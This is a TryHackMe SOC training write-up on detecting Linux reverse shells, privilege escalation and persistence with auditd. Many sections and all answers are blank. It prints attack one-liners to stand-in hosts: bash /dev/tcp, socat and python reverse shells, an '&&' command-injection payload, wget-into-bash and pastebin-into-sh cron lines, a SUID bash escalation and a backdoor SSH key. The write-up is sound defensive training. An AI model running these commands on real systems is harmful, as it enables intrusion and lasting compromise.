---
title: Linux Threat Detection 3
module: Linux Security Monitoring
path: SOC Level 1
platform: TryHackMe
tags: [linux, threat-detection, auditd, reverse-shells, privilege-escalation, persistence]
status: Completed
date: 2026-07-03
date_completed: 2026-07-03
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

## Task 1: Introduction

Not all Linux attacks are simple SSH brute force or cryptomining. This room covers more complex, manual Linux attack techniques seen in targeted intrusions and how to detect them through system logs.

**Learning Objectives**

- Learn how reverse shells are used in Linux intrusions
- Understand how attackers escalate their privileges
- Explore the five most common techniques to persist on Linux
- Uncover the learned techniques through system logs

**Let's go!**

**Answer:** N/A

## Task 2: Reverse Shells

### Attack Convenience

Threat 


### Reverse Shells

Three methods to open a reverse shell on Linux:

| Command on the Victim | Explanation |
|---|---|
| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | The victim is forced to connect to 10.10.10.10:1337 and launch bash for the attacker. |
| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525. |
| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` | Python alternative to the above command. The attacker is listening at 10.30.30.30:80. |



### Detecting Reverse Shells

Reference syntax for tracing reverse shell origin and activity with auditd:

```
ausearch -i -x socat
ausearch -i --pid <parent_pid>
ausearch -i --ppid <child_pid> | grep proctitle
```



**Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?**

**Answer:**

**Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run `127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh` in the web app. What is the flag returned in the TryPingMe response?**

**Answer:**

**Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?**

**Answer:**

## Task 3: Privilege Escalation

### Privilege Escalation Basics

| Preceding Discovery (IF) | Privilege Escalation (THEN) |
|---|---|
| The `uname -a` shows an old, unpatched Ubuntu 16.04 | Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh \| bash` |
| The `find /bin -perm 4000` detects an env binary with the SUID flag | Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p` |
| The `ls /etc/ssh` exposed an unprotected ssh-backup-key file | Try using the file to get root access: `ssh root@127.0.0.1 -i ssh-backup-key` |



### Detecting Privilege Escalation

Reference syntax for confirming privilege escalation by comparing effective user before and after:

```
ausearch -i -x pwnkit
ausearch -i --ppid <exploit_pid>
ausearch -i --ppid <root_shell_pid>
```



**Which command line was used to look for the "pass" keyword in files?**

**Answer:**

**Which command line was used to escalate privileges to root?**

**Answer:**

**Looking at the detected .env file, what was the root password?**

**Answer:**

## Task 4: Startup Persistence

### Persistence in Linux



### Cron Persistence

```
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
```

```
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```



### Systemd Persistence

```
[Unit]
Description=Initial cloud-online job
[Service]
ExecStart=/usr/bin/cloud-online
```



### Detecting Persistence

| Monitor changes in cron job files | /etc/crontab, /etc/cron.d*, /var/spool/cron/*, /var/spool/crontab/* |
|---|---|
| Monitor changes in systemd folders | /lib/systemd/system/*, /etc/systemd/system/*, and less common locations |
| Monitor related processes such as | nano /etc/crontab, crontab -e, systemctl start\|enable <service> |

Reference syntax:

```
ausearch -i -f /etc/systemd
ausearch -i -x crontab
```



**What flag did you get after running the malware persisting as a service?**

**Answer:**

**What flag did you get after running the malware persisting as a cron job?**

**Answer:**

## Task 5: Account Persistence

### Account Persistence



### New User Account

Reference syntax:

```
cat /var/log/auth.log | grep -E 'useradd|usermod'
ausearch -i --ppid <pid>
```



### Backdoored SSH Keys

Reference syntax:

```
echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys
ausearch -i -f /.ssh/authorized_keys
```



### Application Persistence



**Which user was created and added to the sudo group?**

**Answer:**

**Which file was changed to allow SSH key persistence?**

**Answer:**

## Task 6: Targeted Attacks and Recap

### Targeted Attacks



### Linux as Entry Point



### Linux in Espionage



### Linux in Ransomware



### Threat Detection Recap



**Does Linux ransomware exist and impact organizations worldwide? (Yea/Nay)**

**Answer:**

**Should you learn Linux threats even if working with Windows? (Yea/Nay)**

**Answer:**

## Task 7: Conclusion

**Complete the room!**

**Answer:** N/A
